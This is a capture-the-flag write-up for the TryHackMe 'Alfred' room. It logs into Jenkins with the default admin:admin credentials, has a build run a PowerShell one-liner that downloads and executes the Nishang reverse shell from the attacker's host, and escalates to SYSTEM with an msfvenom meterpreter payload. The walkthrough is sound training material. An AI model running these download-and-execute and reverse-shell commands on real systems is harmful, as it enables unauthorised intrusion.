---
title: THM{Alfred}
author: Anugrah SR
date: 2020-11-19 01:30:00 +0800
categories: [Boot2root,Tryhackme]
tags: [ tryhackme, nmap, Jenkins, windows, msfvenom, rustscan, Gobuster]
math: true
image: ""
---
# Alfred
## About The Room
**<br>
* Url: https://tryhackme.com/room/alfred
* Creator: [tryhackme](https://tryhackme.com/p/tryhackme)
* Difficulty: low

## Reconnaissance
### RustScan
```bash
rustscan -a 10.10.117.149 -- -A -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/cyph3r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.117.149:80
Open 10.10.117.149:3389
Open 10.10.117.149:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-20 02:46 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:46
Completed NSE at 02:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:46
Completed NSE at 02:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:46
Completed NSE at 02:46, 0.00s elapsed
Initiating Ping Scan at 02:46
Scanning 10.10.117.149 [2 ports]
Completed Ping Scan at 02:46, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:46
Completed Parallel DNS resolution of 1 host. at 02:46, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:46
Scanning 10.10.117.149 [3 ports]
Discovered open port 80/tcp on 10.10.117.149
Discovered open port 8080/tcp on 10.10.117.149
Discovered open port 3389/tcp on 10.10.117.149
Completed Connect Scan at 02:46, 0.16s elapsed (3 total ports)
Initiating Service scan at 02:46
Scanning 3 services on 10.10.117.149
Completed Service scan at 02:46, 11.81s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.117.149.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:46
Completed NSE at 02:47, 3.85s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:47
Completed NSE at 02:47, 0.87s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:47
Completed NSE at 02:47, 0.00s elapsed
Nmap scan report for 10.10.117.149
Host is up, received syn-ack (0.16s latency).
Scanned at 2020-11-20 02:46:46 EST for 17s

PORT     STATE SERVICE            REASON  VERSION
80/tcp   open  http               syn-ack Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-10-02T14:42:05
| Not valid after:  2021-04-03T14:42:05
| MD5:   fdb2 cd17 fad1 160d 06bc c1d8 31f3 7636
| SHA-1: 6577 409f 2b1a 3e36 7ca7 4449 57f2 98c1 8750 3a3e
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQH2x5JEL9daJC/GWsL/65MDANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZhbGZyZWQwHhcNMjAxMDAyMTQ0MjA1WhcNMjEwNDAzMTQ0MjA1
| WjARMQ8wDQYDVQQDEwZhbGZyZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDwqCu1r5JwNiuelrl1s018MjkydEPIHmhpy2pWh0/wB8aqhHt8bcI48XVd
| 4RBDuij/sy9W9S0LQ6ZtKMzaRlq5mDUx/wPX3p3BRAk6keiqPOOkaOv9DSOQUWzS
| ON4Oz9ICj0zO9QjLZHa4IlcGdlhblzxG+jGX/SZ8gjVOzlQVqU1W+OKt7N6YFEkD
| lJsvnc/cP7V82KbuZiskeLdLtHdKtdVYrR6AdO0ZTmnotnRprUoP/nvaKVWrP29F
| a3I15E/W2uJdWer3gdYK/s4NOlasszIcBgMod0PjAdd0+zbBHy4ExhXn3vSHo3yo
| 1EYZInzAdmD1oOpg3jZqhBisT3i1AgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEA2jHXDxwJLNEy2YiY
| R+W5D6kG/AJ/GRYmXbTHK/Ht5+sgAd0t5CICOJ8+ixm5xsneB2+goR8Z5Ds4z58D
| X3sZswHzynx1eqeFxSIdjLpVMHdoFouZ0qvxSExTFXBV80E/csqQobKSHwYBHzl1
| zs774gm32wvSsWOvKiX8A1WVtWgdhrzGgXOl8WSbVvexVJZgH0S6fP4+2W0Kg+cJ
| JKjm8RRdRX1ir61VSS+bHDFW9V/9DlkJzmqTMet0TkMmENTX0wiKrEWbcFybeeQR
| wVf5ECzwP40SAkraA6Ekmk+uU6NTmFqksElMUsbN4wVfRy7f1jPEpC5SCD/Bcsyg
| alg8EA==
|_-----END CERTIFICATE-----
|_ssl-date: 2020-11-20T07:47:02+00:00; -1s from scanner time.
8080/tcp open  http               syn-ack Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:47
Completed NSE at 02:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:47
Completed NSE at 02:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:47
Completed NSE at 02:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.38 seconds
```
* Discovered open port 80/tcp
* Discovered open port 8080/tcp
* Discovered open port 3389/tcp

## HTTP
![](https://imgur.com/7v2cr1gl.png)

on port `8080`
![](https://imgur.com/cJCLmj9l.png)

Tried good old default creds `admin:admin`, got logged in!

### Jenkins
![](https://imgur.com/61DiL1El.png)

`http://10.10.117.149:8080/job/project/configure`

![](https://imgur.com/bJmfSLzl.png)

`http://10.10.117.149:8080/job/project/1/console` code expected is visible here.
![](https://imgur.com/pGaDrcWl.png)

## Gaining Shell
GitHub project called [Nishang](https://github.com/samratashok/nishang) and download a script called Invoke-PowerShellTcp.ps1

`wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`

![](https://imgur.com/62hUR1Fl.png)

`powershell invoke-expression (New-Object Net.WebClient).DownloadString('http://10.8.131.89/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.131.89 -Port 9000`

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.117.149 - - [20/Nov/2020 04:15:10] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
Press `build now` on the sidebar
```bash
┌──(cyph3r㉿kali)-[~/Documents/thm/alfred]
└─$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.8.131.89] from (UNKNOWN) [10.10.117.149] 49282
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>

```
### User flag
```bash
PS C:\Users\bruce\Desktop> type user.txt
79007axxxxxxxxxxxxxae2a0
PS C:\Users\bruce\Desktop>
```
## Privilege escalation
###  msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.131.89 LPORT=4444 -f exe -o rshell.exe
```
```bash
powershell invoke-expression "(new-object system.net.webclient).downloadfile('http://10.8.131.89/rshell.exe','rshell.exe')"
```
```bash
PS C:\Program Files (x86)\Jenkins\workspace\project>PS C:\Program Files (x86)\Jenkins\workspace\project> dir


    Directory: C:\Program Files (x86)\Jenkins\workspace\project


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        11/20/2020   9:25 AM      73802 rshell.exe                        


PS C:\Program Files (x86)\Jenkins\workspace\project> powershell start-process "rshell.exe"
PS C:\Program Files (x86)\Jenkins\workspace\project>
```
![](https://imgur.com/PO8oDJil.png)
### msfconsole
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 528   520   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 576   568   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 584   520   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 612   568   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 672   584   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 680   584   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 688   584   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
```
`NT AUTHORITY\SYSTEM`           `C:\Windows\System32\services.exe`

```bash
meterpreter > migrate 672
[*] Migrating from 2276 to 672...
[*] Migration completed successfully.
meterpreter > search -f root.txt
Found 1 result...
    c:\Windows\System32\config\root.txt (70 bytes)
```
### Root flag
```bash
meterpreter > cat root.txt
��dff0f74xxxxxxxxxxxxxxxxxxxx46b4a
```
